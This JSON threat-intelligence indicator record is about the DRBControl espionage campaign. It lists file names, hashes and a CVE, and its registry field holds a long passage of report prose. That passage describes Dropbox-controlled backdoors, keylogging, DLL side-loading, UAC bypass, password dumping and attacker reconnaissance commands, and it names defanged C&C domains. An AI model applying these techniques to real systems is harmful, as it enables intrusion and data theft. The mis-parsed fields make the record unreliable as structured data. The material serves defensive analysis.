{"rule_id": 561, "name": "wp-uncovering-DRBcontrol", "description": "-", "references": ["CVE-2017-0213"], "File_Names": ["protection.html", "i610.exe", "Runner.AD", "Firewall.exe", "ROZENA.AM", "RUNNER.AD", "drm.exe", "wlbsctrl.dll", "setup443.exe", "Mimikatz.AS", "CVE20170213.AA", "WinDRM.exe", "Eventvwr.Exe", "ReadPsw.cpp", "provadys.com", "license.rtf", "diskshawin.exe", "myip.com", "IPScan.AB", "t32d.exe", "enigma0x3.net", "rsoplicy.exe", "dotnet.html", "run.sct", "www.imr", "wallet.dat", "SKTest.exe", "sps.html", "Videos.exe", "diskwinshadow.exe", "info.cab", "bin.asc", "0213.cpp", "config.exe", "run64.bat", "Kaspe.exe", "PWDump.AC", "test.cab", "Csres.exe", "passuac.dll", "DRM.exe", "clip.exe", "enum_cred_store.rb", "thumb.dat", "CLAMBLING.ENC", "License.rtf", "immuniweb.com", "HYPERBRO.ENC", "mpsvc.mui", "RSoPProv.exe", "cloud.html", "csres.exe", "rpcss.dll", "advanced.html", "KB3023607.zip", "data.dat", "solutions.html", "CLAMBLING.END", "Nbtscan.AA"], "MD5_Hashes": [], "SHA1_Hashes": [], "SHA256_Hashes": ["489310f5f63045a83251c4f457d2baa4b0c57e5ee7b3d147ee63913352a2c7f1", "927da2ff9203eb77a66fa7b23f9f1c3655b357fc2418422ed2d5813882a6ae5a", "d4d8a8cd8da49c7ae974d6774458d6267463eb62e798ced51865e7f88a64969e", "a3d9aac7291e356a64b0892f4ec85f1cdcb3dea71b820917fcd5011fb555989d", "d50debb2bce2d1a425f524a11a80b5dc24ae74a419024782095a0ba981cb483a", "ae4b9dd3709e4e5e30ce62e7e4075f366f38676e2bad165da3ab4690251e70ae", "4ccd6555b004ebde29d79c435e4d0191fd7cf607b2d3b7a0c83cb27b3a3b2cbf", "28d2637139231c78a6493cd91e8f0d10891cfeb6c5e758540515faa29f54b6b2", "d62ddac7c4aa152cf6f988db6c7bd0c9dcffa2e890d354b7e9db7f3b843fd270", "b823c03be8959b7636997616811ed69b2d611b8505b4f06958c7dc430e3cd681", "9a6da3d7465b7cf6da32f80f2cd9009d7726dfbb128ec0b343fccfcc954de96a", "929ff464b5e68b1dc4c5e5b2dc99acae1449a376251da87ab666698499f12ff7", "b5546d4931a0316abd4018c982558ed808b4d0a60233ac18bee601fa09d95ee6", "24f501141af5bf059509145e165302dd7087b1d1c2136bc5e4403f01435f250e", "970388a8256c722e792d26374a3db7c6015a6bab4544c3981fac0d928ef07a12", "c42ccb2c8dc43164db267b68578a3c8869adc4f5062063e7a6b942ecea8c4402", "e5ee105aa029e3ad4b8f01ef4c78f4c65b623213925e91173488af1a4e15c177", "a58946c10c8325040634f7cd04429b9f1e3715767d0c8aec46b7cba8975e6a69", "3d0d4945275cdbae9911183dd17fb5e118216816e1c9abc2cecfb65c4ef9d708", "29e50893c10897684d8b81f0d511d4073442e385d2ab2ee6c9a9c0189851f72c", "9418c3ac53ed7bec0dea36918c3a1862868b2d8f4e696db509b1ec7aa09bd976", "52c147c8eadb58d3580b39c023ce4a90dacce76ee5c30c56c56ea39939a56b52", "6655c84e064f744e99fc4d7e50487239604df5f97996eaa8507df7744a8b4de3", "b226c8e85a7b1a6d4d29d42fc84bc7f3a32335fc7ba44b455a7716d706660873", "8c0b0c86a3b055df36304d5421f1003e0e78368e421341d404e25ddf8f5f714b", "46532c3fbd3e73682ea7c4fdec6a26fffa7baff36a78fd821b8bfe7721fc92ef", "5b5aff8869ba7f1d3f6ad7711e801b031aedeff287a0dcb8f8ae6d6e4eb468af", "23cd30aaf21d02bde349e6c1761165120c0e2ded626a2de583103e1559e5b9f4", "0aa627736df73c543c26c3f033f1962282dd005e6a0ec8d9357df3511b2fc8a6", "260b64e287d13d04f1f38d956c10d9fdd3cfbff6ba0040a52223fa41605bb975", "0105718608ae7b8d782ae6e480d685dca1abc2deef29f0241d70de88f6da8dd5", "8b8735a05ce7dc5f061fc1bd1ca4ad9934da26d8c1d0585db72dfe74115ee6ed", "98a0a78219aa7d67865615090d53916c9b4e7d3ea900080c268806c48bb41499", "76e41cd6cd30af04fbe540de60fa0f0873d65fb94727b921b2483c5d9e1cbdeb", "52c02e9d24913761f508b0be1604b357acbe73c65df410b5588eef0e14cf812f", "832c5cbe153d7687e8e72a1108bf2f38e88d30de5b9432c5ff8fdef9d190ec02", "e18af309ecc3bc93351b9fa13a451e8b55b71d9edcc4232bc53eb1092bdfa859", "0351c808c016cd5190ea45d5243c6a2c6cd3b5fc4e22571e06b948910e5535f9", "a58f2fea8c74c1d25090014c7366db224102daa6c798fcdfb7168b569b7d5ca2", "9e3b82a55d3bd9773aaa50396436aec085eeb34e6efda70d6b2946a571911601", "fc865a720cb808354923092bac04ab6a75e20ea92db5a343af07365c0cd2b72a", "5da3811c4f15d04444d4c3721e7cc9be106bb1fe2b1bc95c3fe09d991df2a5e8", "412260ab5d9b2b2aa4471b953fb67ddc1a0fe90c353e391819ca7ac1c6d3146f", "91ccf1148f8573a8ef74e9f65c330e8f1f5fe67dc33b99f30e0d3fed69f3d0f0", "a22815279cac432e5951cec72a0d24a53319e2d85e843e436c8b181ab43979b6", "2fcb7ae3387634fda8f2fa87b7d2eac03660fce49f0732b07d8cf41693801577", "dd0399970d2dbb5ab8b5869e2fafb83194c992f27bbb244adce35e2fe6ef0d28", "8c03324d303c4bf4f180f400537a307750561de37ed92691d46c09ef2caa22b0", "ca26a34153972cc73c63d3a9aadd3b12ba35ecdc6e39025b75be56b00c20e0ae", "180640b1e69c48eae468f59c7967df8d3f4dcfd0bb69ce3bbed3663b6ceebc87", "017a10eebddd3a1aca9b035413906da562331c6d1675efb02bb63bbe13b99165", "a219dfc28426bf36af578e2dbc4a65abdae51e0c3df87c4cb3a2c8f9e0088d32", "8bc65935aa19e95b52d7ecc1d5d8f15c0c85fde28d39c0a1844ca90a912cd502", "f9759b5046d67d07ed4a0b07316d6797feb2293a8cbd3c4bc78c90269b87fe3f", "5713907c01db40cf54155db19c0c44c046b2c676a492d5ba13d39118c95139bf", "0a6dc8a6868f6882ea9d5998b01ab871746b1ba27641c1b3ff73985878081e93", "24ebd398be23135a2d8aa7000c2b6a534448b87aa5708b8546089630a8035f7e", "685f372013eb8b5580e603a159c4b68b226b2ae96e00629a567ee0d1ebcc66ec", "021751637a8fff2c48fd543316c25a7090d4ac96f81efb2cfd2a8bb239bafdfd", "eb8bb1e6b1f832a7009ba441d6365b225324ff582402daebfab83dcbcc55179f", "c6064fb44733b5660557e223598d0e4d5c4448ad20b29e41bef469cb5df77da0", "4e3e9e4613d414ba671fd35d7d70d0c3093cd322f5f297281a502420741c03c8", "d2f12b1492ab90e61c16d41d79ee3f28a7773656ccf4c3459afedb2bf46cca18", "79928578cdd646a9724bc6851a1ee77820c81a3100788d62885f9d92b6814085", "28d19a23d167db3e1282f1c6039bcda6556798be054994a55e60116827dd0bf1", "cd651d4e8e5f9587f560a94c0a5ec6283938b906b4831341beb186eec11145cd", "5aee7ae5dd28fcd7e672912292061022c29538bf9264db56b30efdbc8d45abc0", "b3581e8611f5838fc205f66bc5ca5edddb0fd895e97ebf8f0c7220cb102ae14b", "d5e98fb0f05f28183f51a66b0032525ebedc55f056c0ddff2bf15a5eb3016fdd", "ea45f845eb490991c56946441dce26fe5ecd62ec2b33afe9ba31f4432aa4f1ef", "bfd5056cfbec3a43656c2ceb27cacea5de27c7a82f21d2897826ce1e1748666a", "0693713f995285e8bd99ebfca2c4f0f1a8e824dafb5a99693442a9256df06e02", "cd5a3c0d92b76bd29fbb5dffaab6144487d35d83d3ab3e4ea545a0ea58ca9140", "ee5f7e6ad4a344f40b9babada1654ea22333bb5150cfd26bfc239ead28b6528c", "799b7395c9f279d8cd1cd24657788ecb37db7ae03c0dddeb3344a95a551d1325", "1951c79f280692a43b7c7cafd45c3f5d7f4f841ae104a6cad814fab4641c79f2", "e82e7b6dbf074bb189cd639f70137d3d4350423fd4e84898688920d0110110b8", "fdf1899eb1457acc2a59b89b0542d53cddcb5553e6fc53ced099473a59fce67c", "f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd", "fa10b6cf0bd9de0734ecca6650de214647ec7305af90f9a4dfdc5e092706cb11", "56758c25e3b00957c6f7f76fcea5d0598eff7eda98c63f50b51d1c28f267ac8f", "b5ce4eb3289c6794aecf3625b8c3b2044ddb1be93e538571ca8d5670c6fcf2ed", "7602e2932a10f3750a5d6236f6c1662047d4475c6e1fe6c57118c6620a083cb3", "d201e726fd2a2f4b55ea5ca95f0429d74e2efb918c7c136d55ef392ceac854d6", "e52034cb8b5f170c8174ea2b9ede2785d093360a57359261e2dfb436cd644038", "d5129308ee83a852e6a320ca68c8e66ed6d1eb4ec584dd0c8b5f313a56c49a15", "b4d4dfeb086872500891aa875eb221e8fc95e0c4566a07bc8adda5bd19ab76f3", "4c08bc1a2f5384c5306edc6f23e4249526517eb21a88763c8180a582438dfa31", "58597b5469a9b1af44b73937c3c44ce4dcea841a3eff3508dc0bed0bcb2ff10a", "9897e28cd7f1e26eb9115c99188192747ea39fee9aa8c22633e336beeb76f109", "d1294a1e043bb882e99f278fa51ceefadc0939fedc47306e475fbdcbb210dc5b", "30998c7d7496bf36b70232935b9dd1b0f84a6b7f288417312aab37d2a5dc360e", "9dd1d21e9431cfe25709a8f26ec0f605ed19cf64ca1922e97fad7b7f2d2e82ea", "bd278f8fbd5af15beddf5f1d8f7c20bec368fae2e7cb5ef16e2b50434d30a384", "4de1c404a9213a82d9fd1dea04fe097b6d92a1f7fda84481e6dda41d72dc34e5", "f80f78972b58ab78b0657c546323538966d9cd828892d4dc07cee6f6d5614f6b", "37286285cb0f8305bd23a693b2e7ace71538e4c0b9f13ee6ca4e9e9419657813", "b35e3d9835910c50502cf4753e77b50d279a9f9056f64bd609b865ded8a79d0c", "64469d27fec40f50b06812c2d2fdbe5dd73a3b258f304f48f97e9c792e1a0c6f", "9b957bfe1bdbed23e5d45d6f30c7d666f2c65af32779d09927dfc0f79f6f7b91", "f7ef0e754b004910d40a47ca57b9cf41f63e2a06ba7cc495cb40771a017a8689", "c88196c1ec9d29326cee11d04e73a3f6ce80a2bad5363925fd9520e64727407b", "c425b73be7394032aa8e756259ebf3662c000afaa286c3d7d957891026f3cbb4", "c3c70ca2c473e166d0890450c70e3fafdc98f10f2027a1aa0d78a75170df2b69", "f52b3f5f8213709bb5617fd02e702dee10935eefb96f44e8afa35af17c81d05b", "96282a625a31b6bf646c6e01ad20de96fd63c345881a9c91190940121580059d", "a44136c9ae13435882c5c2aded9ed8bd5e8c1a64520ab83a17cffa03ea3852d1", "57430caade5b791152f97b18e7037a4274e954ad5fed9b465063d43bde2d08a1", "d72c3f5f2f291f7092afd5a0fcaceaf2eaae44d057c9b3b27dd53f2048ed6175"], "Registry_Entries": ["HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir  + \n\n\u201cwallet.dat\u201d\n\n\u2022  Existence: \u201cYES\u201d if the wallet file exists, \u201cNO\u201d if otherwise\n\nThis information is written in plain text to Dropbox by using the API in a file named with the current date \n\nand time. The malware then searches for a file named bin.asc in a specific Dropbox directory. If this file \n\nexists, the malware checks if it starts with \u201cGIF\u201d then decrypts the rest of it, starts a suspended svchost.\n\nexe process, writes the decrypted shellcode to it, and resumes its execution.\n\nWe found different payloads being delivered through Dropbox that will be covered in a separate section \n\nbelow. It is worth noting that the threat actor used multiple Dropbox repositories, each one storing different \n\ninformation. They were split as the following:\n\n\u2022  Backdoor and storage of target user\u2019s workstation information \n\n\u2022  Storage of commands, results, heartbeats, and post-exploitation tools\n\n\u2022  Stolen files from target user\u2019s computer\n\nThe versioning shows the malware\u2019s rapid pace of development \u2014 Version 1.0 was used in late May 2019, \n\nversion 8.0 in late July 2019, and version 9.0 at the beginning of October 2019.\n\n11 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fWinDRM/Firewall\n\nStart\n\nEnter side-loading \nDLL\n\nUnpack loader in \nmemory\n\nLoad MUI \ufb01le to \nmemory\n\nExecute unpack load \nin MUI \ufb01le\n\nStart svchost.exe \nand inject DLL\n\nsvchost\n\nStart\n\nsvchost\n(second channel)\n\nConnect to C&C\n\nWait for command\n\nInformation \ngathering\n\nUpload info to \nDropbox\n\nCheck Dropbox \npayload\n\nFound\n\nStart svchost.exe \nand inject payload\n\nStart\n\nUnpack and execute \n\ufb01rst payload\n\nLoad second payload \nfrom Dropbox\n\nUnpack and execute \nsecond payload\n\nRemote control via \nDropbox\n\nFigure 9. Code flow of the latest version of the backdoor\n\nKeylogger Feature\n\nThe keystrokes are logged to the file %USERPROFILE%\\AppData\\Roaming\\(IID).log, while the clipboard \n\nis stored in the file %USERPROFILE%\\AppData\\Roaming\\(IID).pas. They are obfuscated via a very simple \n\nalgorithm:\n\nFigure 10. Keylogger encryption algorithm\n\nAfter decryption, the files will look like this:\n\nFigure 11. Sample of logged keystrokes\n\n12 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fFigure 12. Sample of a logged clipboard\n\nIt  is  worth  noting  that  the  first  sample  we  found  has  no  campaign  name  or  version  number,  and  the \n\nDropbox feature is not present. It also embeds only two plug-ins (CHPCmd and CHPExplorer) and two \n\nnetwork plug-ins (CHPTcp and CHPHttp), and does not implement the UAC bypass feature. This is the \n\nsample that we found being dropped by spear-phishing documents. It should also be noted that checking \n\nfor Bitcoin wallets was removed in version 9.0.\n\nAs previously mentioned, the first backdoor is downloaded from Dropbox, and itself uses Dropbox as its \n\nC&C channel. The backdoor handles different commands, as listed below:\n\n\u2022  0x02: Enumerates drives\n\n\u2022  0x03: Enumerates files\n\n\u2022  0x04: Executes file and sends output to C&C\n\n\u2022  0x05: File operation:\n\n\u00ba  0x01: Moves\n\n\u00ba  0x02: Copies\n\n\u00ba  0x03: Deletes\n\n\u00ba  0x04: Renames\n\n\u2022  0x06: Uploads file to Dropbox\n\n\u2022  0x07: Downloads file from Dropbox\n\n\u2022  0x08: Executes command via console\n\n\u2022  0x09: Runs binary through process hollowing\n\nWhen  starting,  a  machine  ID  is  generated  and  stored  in  HKEY_LOCAL_MACHINE\\Software\\Classes\\\n\nCLSID\\<IID>.  A  directory  named  <IID>  is  also  created  in  Dropbox,  which  will  be  used  to  store  files \n\nharvested from the victim.\n\nThe code uses three hardcoded filenames:\n\n\u2022 \n\nyasHPHFJ: Contains commands to execute\n\n\u2022  Csaujdnc: Contains the result of the execution\n\n\u2022  eLHgZNBH: Heartbeat\n\n13 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fDropbox-Downloaded Backdoor Loader\n\nSince the Dropbox-downloaded backdoor is loaded into memory by the type 1 malware, it cannot run \n\nalone.  Consequently,  we  found  another  malware  family  that  has  the  unique  purpose  of  running  those \n\nDropbox backdoors.\n\nThis backdoor also uses the DLL side-loading technique,4 this time abusing a vulnerability in some versions \n\nof the legitimate Windows service IKEEXT, which is used for IPsec connections.5, 6 This service loads a \n\nDLL  named  wlbsctrl.dll  from  directories  in  the  PATH  variable.  We  saw  the  actor  copying  a  malicious \n\nwlbsctrl.dll file to the following directories: \n\n\u2022  C:\\ProgramData\\Oracle\\Java\\javapath\\\n\n\u2022  C:\\ProgramData\\\n\n\u2022  C:\\Users\\Administrator\\AppData\\Roaming\\npm\\\n\n\u2022  C:\\ProgramData\\GooGet\\\n\n\u2022  C:\\php\\ \n\n\u2022  C:\\Windows\\System32\\\n\nThe code is very short; the malware will retrieve pointers to some specific functions, parse the header of \n\nthe file to be loaded looking for some pointers, and pass them all as arguments to the Dropbox backdoor.\n\nDropbox has since clarified that concerned tokens were expired in August.\n\nCommunication Redirection\n\nWe found a sample related to this case. The sample implements some of the classes mentioned earlier \n\nwith a few more:\n\n\u2022  CHPHttp\n\n\u2022  CHPNet\n\n\u2022  CHPTcp\n\n\u2022  CHPUdp\n\n\u2022  CHPListener: Virtual class implemented by network listeners\n\n\u2022  CTcpListener: Class redirecting TCP communications\n\n\u2022  CUdpListener: Class redirecting UDP communications\n\n14 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fThis sample works as a network redirector and interprets four parameters:\n\n\u2022 \n\nl: Listen port\n\n\u2022  p: Remote server IP address\n\n\u2022 \n\nr: Remote server port\n\n\u2022  m: Protocol (TCP or UDP)\n\nThe traffic of the specific protocol arriving on the specified port will be redirected to the remote IP and \n\nport. The compilation timestamp of this sample is 2019-08-24.\n\nType 2 Backdoor\n\nLoading the Payload \n\nThe second backdoor type that we found was also written in the C++ language. To unpack this backdoor, \n\nthe threat actor uses the Microsoft executable that is vulnerable to DLL side-loading, similar to the one \n\nused in the type 1 backdoor. \n\nA compressed and obfuscated version of the backdoor is stored in a file with a fake .RTF extension. That \n\nfile is loaded and unpacked by a specially crafted mpsvc.dll file, which is being loaded by the Microsoft-\n\nsigned file MsMpEng.exe. \n\nBackdoor Features\n\nThis backdoor uses a configuration file that contains information such as the C&C domain and connection \n\nport, the directory and filename where the malware is copied, and the name and description of the service \n\nthat is created for persistence. The configuration is obfuscated by a simple algorithm embedded in the \n\nPE file.\n\n15 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fFigure 13. Config decryption routine\n\nWhen the malware is first run, the obfuscated configuration is appended to a randomly generated GUID \n\nand stored in the HKLM (or HKCU)\\SOFTWARE\\Plus registry key inside the CFG value. When the backdoor \n\nis run without arguments, it will create a copy of itself in the directory specified in the configuration file.\n\nThe malware then sets its persistence mechanism. Depending on the user privilege, it will either create a \n\nservice or modify the HKEY_CURRENT_USER\\Microsoft\\Windows\\Run registry key to run itself with the \n\n\u2013PO argument. If necessary, it will also run itself with the \u2013UC argument to bypass UAC.\n\nThe following arguments are handled (one at a time):\n\n\u2022  PO: Injects backdoor into svchost.exe via process hollowing and runs it with \u201c-OE\u201d argument \n\n\u2022  OE: Initializes all plug-ins and starts communication with C&C; one of the threads runs the backdoor \n\nwith the \u2013KG argument on every RDP session\n\n\u2022  UC: UAC bypass\n\n\u2022  KG: Keylogging feature initialization (discussed later)\n\nLike in the type 1 backdoor, the RTTI information is available in this sample. The following classes were \n\nobserved:\n\n\u2022  CNet: Virtual class implemented by other network-related classes\n\n\u2022  CNetHttp: Class related to HTTP communication protocol\n\n\u2022  CNetTcp: Class related to TCP communication protocol\n\n16 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\f\u2022  CPlugin: Virtual class implemented by other classes\n\n\u2022  CFileManager: Class related to file handling (read, write, list, execute, etc.)\n\n\u2022  CKeylog: Class related to keylogging feature (discussed later)\n\n\u2022  CMuture: Class handling console input and output\n\n\u2022  CPortMap: Class handling socket binding\n\n\u2022  CShell:  Class  handling  command  execution  via  cmd.exe;  input  and  output  are  handled  through \n\nnamed pipes\n\nKeylogger Feature\n\nA thread makes sure that the backdoor runs with the \u201c-KG\u201d parameter inside every RDP session.\n\nFigure 14. Backdoor set to run with the \u201c-KG\u201d parameter\n\nA file named %USERNAME%.rpt is created in the same directory as the malware using this output format: \n\n%username%  |  [YYYY-mm-dd  HH:MM:sss]  |  <process  name>  |  <window  title>.  The  file  is  obfuscated \n\nbefore being written to disk using a simple algorithm:\n\nFigure 15. %Username%.rpt obfuscation routine\n\nWe found three samples related to this backdoor. The only difference was the embedded configuration \n\nfile. The samples, together with their C&Cs, file paths, and service names, can be found in the IoCs.\n\nWe  also  discovered  an  old  version  of  this  backdoor  being  dropped  by  a  weaponized  Microsoft  Word \n\ndocument from July 2017. The C++ classes were named similarly. This suggests that DRBControl is not \n\na newcomer.\n\n17 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fOther Malware Families Used\n\nWe found several other malware families related to DRBControl. The found families are a mix of widely \n\nknown and less common malware.\n\nPlugX RAT\n\nWe found a variant of the well-known PlugX malware using the same C&C utilized by a type 1 backdoor \n\nsample  from  the  campaign.  The  hardcoded  version  number  in  the  binary  is  \u201c0x20120123\u201d  and  the \n\nconfiguration file is 0x150C bytes long. The C&Cs are www.kkxx88866[.]com and www.betwln520[.]com, \n\nand the file is copied under the %ALLUSERSPROFILE%\\Mico directory.\n\nSome  strings  from  the  regular  PlugX  have  been  slightly  modified,  likely  in  an  attempt  to  evade  simple \n\ndetection  rules.  As  examples,  \u201cJoProcBroadcast\u201d  became  \u201cJ0Pr0cBr0adcast\u201d,  and  \u201cOlProcNotify\u201d \n\nbecame \u201c0lPr0cN0tify\u201d.\n\nThe  malware  is  also  dropped  via  the  DLL  side-loading  technique.  Although  this  time,  the  vulnerable \n\nfile  is  a  legitimate  Chrome  installer  that  loads  a  malicious  goopdate.dll  file.7,  8  This  .DLL  file  decrypts, \n\ndecompresses,  and  loads  a  third  file  named  license.rtf,  which  is  the  final  PlugX  malware.  The  similar \n\nnaming is yet another link to the TTP of DRBControl. \n\nThe malware was found because of the shared infrastructure, but we do not have any insight into the way \n\nor the time it was used. Some hints point toward a very old sample \u2014 we found it in a .ZIP file named \n\nKB3023607.zip, which relates to a fix that Microsoft issued in February 2015.9 Moreover, the compilation \n\ndate of the unpacked sample indicates 2015-10-14, but the modification date of license.rtf in the ZIP file \n\nis 2018-08-10. It also seems that no IP address has been assigned to the C&C domains until March 2018.\n\nTrochilus RAT\n\nTwo  samples  belonging  to  the  Trochilus  RAT  family  can  be  linked  to  domain  names  that  DRBControl \n\nused. The samples are Nullsoft Scriptable Install System (NSIS) installers that drop two files: rpcss.dll and \n\ndata.dat, which is the backdoor in an encrypted format.\n\n18 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fBoth samples copy the files to %ALLUSERPROFILE%\\Medialoader, and, if running with admin privileges, \n\ncreate a service named medialoader that runs the DLL at boot time. The setup443.exe file was hosted at \n\nthe address hxxp://juchaoba[.]com/plus/guestbook/images/setup443.exe. We speculate that the site was \n\ncompromised to host the setup443.exe file.\n\nThe  diskshawin.exe  file  is  dropped  by  an  SFX  RAR  file,  which  drops  three  files  (run64.bat,  csres.exe, \n\nand diskshawin.exe) into %SystemRoot%\\Fonts and launches run64.bat. Csres.exe is a custom installer, \n\nwhich, based on the user privileges, will either create a service named SESSRV, use UAC bypass, or just \n\nrun the malware during every RDP session.\n\nThis  installer  creates  several  mutexes  that  have  been  seen  in  other  known  malware  families  linked  to \n\ndomain names reportedly used by the Winnti group.10 We discuss this later in the Links with Known Threat \n\nActors section.\n\nMFC Keyloggers\n\nWe  also  found  two  additional  malware  samples  using  the  Microsoft  Foundation  Class  (MFC)  library \n\nand has links to the domain name shopingchina[.]net used in this campaign. The purpose is to capture \n\nclipboard and keystroke data and send it to a PHP script hosted on the C&C.\n\nHyperBro\n\nThe custom in-memory HyperBro backdoor11 was also found to make up DRBControl\u2019s arsenal. Loading \n\nthe payload is similar to the type 1 backdoor, which involves abusing a legitimate Microsoft executable, \n\nbut this time the MsMpEng.exe executable is a 32-bit file.\n\nThe  encrypted  backdoor  is  stored  in  a  file  named  thumb.dat,  which  is  decrypted  and  loaded  by  the \n\nmpsvc.dll file. An additional config.ini file contains a GUID. By looking at the RTTI class names, we found \n\nclasses that were not present in a Palo Alto blog post12 on HyperBro:\n\n\u2022  VTClipboardInfo\n\n\u2022  VTClipboardMgr\n\n\u2022  VTFileRename\n\n\u2022  VTFileRetime\n\n\u2022  VTKeyboardInfo\n\n\u2022  VTKeyboardMgr\n\n\u2022  VTRegeditKeyInfo\n\n\u2022  VTRegeditMgr\n\n\u2022  VTRegeditValueInfo\n\n19 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fThe class VTFileDataRes was removed, and the URI pattern to contact the C&C changed from \u201c/ajax\u201d to \n\n\u201c/api/v2/ajax\u201d. Another difference was the options passed to the compiler, as our sample did not use a \n\nstack cookie (/GS in Visual Studio).\n\nThe  sample  contained  a  hardcoded  version  number  and  date  of  2.0.9  and  \u201cFeb  04  2015.\u201d  From  an \n\ninfrastructure point of view, the C&C had striking similarities with the more recent C&C used by the type 1 \n\nbackdoor, which led us to believe that this sample is related to DRBControl.\n\nCobalt Strike\n\nWe  also  found  a  sample  of  Cobalt  Strike  linked  to  the  cdn[.]kkxx888666[.]com  subdomain.  The  same \n\ndomain name has been used by an old type 1 backdoor and a PlugX sample.\n\n20 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fPost-Exploitation Tools\n\nDuring our research, we found several other tools used by DRBControl. Among its arsenal were a clipboard \n\nstealer, wherein the content is encrypted with the same algorithm as the type 1 backdoor; a network traffic \n\ntunnel named EarthWorm;13 a public IP address retriever;14 an NBTScan tool for enumerating NetBIOS \n\nshares; a brute-force tool;15 and an elevation of privilege tool for exploiting CVE-2017-0213.16 We also \n\ndiscovered password dumpers, tools for bypassing UAC, and code loaders in the post-exploitation tools.\n\nPassword Dumpers\n\nWe  found  multiple  password  dumpers  in  DRBControl\u2019s  toolkit.  Some  of  them  were  known,  such  as \n\nQuarks PwDump and modified versions of Mimikatz that only dump login passwords. Others are based \n\non publicly available source codes.17, 18 Based on the PDB path, the latter was named NetPwdDump by \n\nthe malicious actor. Another tool dumps SQLite data from the files stored on the \u201c\\Google\\Chrome\\User \n\nData\\Default\\Login Data\u201d directory.\n\nUAC Bypass\n\nMany samples were simple implementations of publicly known techniques for bypassing UAC. Implemented \n\ntechniques include UAC bypass via elevated .NET applications,19 Win7Elevate,20 and eventvwr.exe and \n\nregistry hijacking.21\n\nCode Loaders\n\nMany  of  the  tools  used  were  simple  code  loaders.  DRBControl  might  be  using  them  to  bypass  code \n\nexecution restrictions or evade security solutions.\n\nOne of them takes a hostname and a port as the parameter, uses the information to connect to a server, \n\ndownloads  code  (probably  a  position-independent  shellcode),  and  executes  it.  Another  tool,  named \n\nNetUseEngine on the PDB information, is used to create a service and launch it when the system boots. \n\nIt takes three parameters: install, special, or uninstall.\n\nThe malicious actor also wrote a tool to run a command by copying it inside a run.sct file and executing it \n\nvia the Squiblydoo technique.22 Others are even simpler, launching c:\\programdata\\b.bat via WinExec or \n\nCreateProcessA. We even found a b.bat file launching Mimikatz.\n\n21 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fInfrastructure Analysis\n\nThere were not many domain names linked to DRBControl, and the infrastructure was diverse. In most \n\ncases, we could resolve IP addresses only for the subdomains hardcoded in the malware samples, but \n\nthe domain names didn\u2019t have IP addresses linked to them. On multiple occasions, different subdomains \n\nled to different malware families. For instance, the attacker pointed some domain names to 127.0.0.1, \n\nwhich is a known practice of some threat actors.\n\nMore  recently,  the  attacker  switched  to  IP  addresses  that,  based  on  the  Whois  Lookup  record,  can \n\nbe identified within the Google Cloud address space. (It should be noted, however, that this does not \n\nnecessarily mean a direct abuse to the platform.) When browsing the C&C domain names or IP addresses, \n\nwe noticed the returned content was a simple HTTP header that redirects the user to a legitimate website \n\nsuch as Google or Dropbox. This is consistent with the malicious domain names that sometimes contained \n\nthe company names. \n\nReview of DRBControl\u2019s Activities\n\nDRBControl\u2019s activities can be reviewed based on the commands they sent to 67 different IDs:\n\nList \ufb01les\n\nRun command\n\nUpload \ufb01le\n\nDownload \ufb01le\n\nList drives\n\nDelete \ufb01le\n\nExecute \ufb01le\n\nRename \ufb01le\n\nCopy \ufb01le\n\n0\n\n1,000\n\nFigure 16. Command type sent by DRBControl\n\n22 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fCommand\n\nNumber of \noccurrences\n\nnetstat -ano\n\ntasklist\n\nsysteminfo\n\nquery user\n\nipconfig /all\n\nwhoami\n\nreg query \u201cHKEY_CURRENT_USER\\Software\\\nMicrosoft\\Terminal Server Client\\Default\u201d\n\ndir wlbsctrl.dll\n\ntype log.txt\n\nset\n\n24\n\n19\n\n19\n\n18\n\n16\n\n15\n\n12\n\n11\n\n10\n\n10\n\nTable 1. Top 10 commands issued by DRBControl through \u201ccmd /c\u201d\n\nOf the 51 files that the attacker deleted, the majority were post-exploitation tools. Notably, in two cases, \n\nthe  attacker  deleted  the  file  c:\\ProgramData\\SxS\\NvSmart.hlp,  which  is  known  to  contain  keylogging \n\ninformation generated by the PlugX malware. All of the downloaded files were post-exploitation tools.\n\nAmong the uploaded files, there were many Office and PDF documents, key logs, SQL dumps, browser \n\ncookies,  and  even  a  KeePass  database.  Another  interesting  note  is  that  the  download  and  upload \n\ncommands  included  the  remote  file  path  as  an  argument,  which  allowed  us  to  see  how  the  attacker \n\norganizes its files.\n\nSome parent directories from which the attacker copied  the  stolen files  were  interesting:  \u201cC:\\Projects\\\n\nDropbox\\Test  Version\\DRBControl\\Release\\Downloads\\\u201d,  or  \u201cC:\\Users\\Win2008_x64\\Desktop\\drb\\\n\nDownloads\\\u201d. The attacker would then create a directory structure of \u201c[ <victim\u2019s IP address> ]\\[ <victim\u2019s \n\nID> ]+[ <username> ]\\<stolen file path>\u201d or \u201c<Victim\u2019s ID>(<computer name>)\\<stolen file path>\u201d. Some \n\nof the attacker\u2019s directory names contained Chinese words, such as \u201c\u5907\u4efd\u201d (\u201cbackup\u201d) and \u201cUAC \u63d0\u6743\u201d \n\n(\u201cUAC elevation\u201d).\n\n23 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fLinks with Known Threat Actors\n\nOur first speculation was that this attacker was new, as we had never seen the type 1 and type 2 backdoors \n\nbefore and did not find infrastructure similarities with other threat actors. However, our analysis revealed \n\nsome connections to known threat actors, listed below.\n\nWinnti\n\nAside from being motivated by profit, the Winnti group has gained notoriety for their involvement in various \n\nmalicious  activities  associated  with  targeted  attacks  and  utilizing  self-developed,  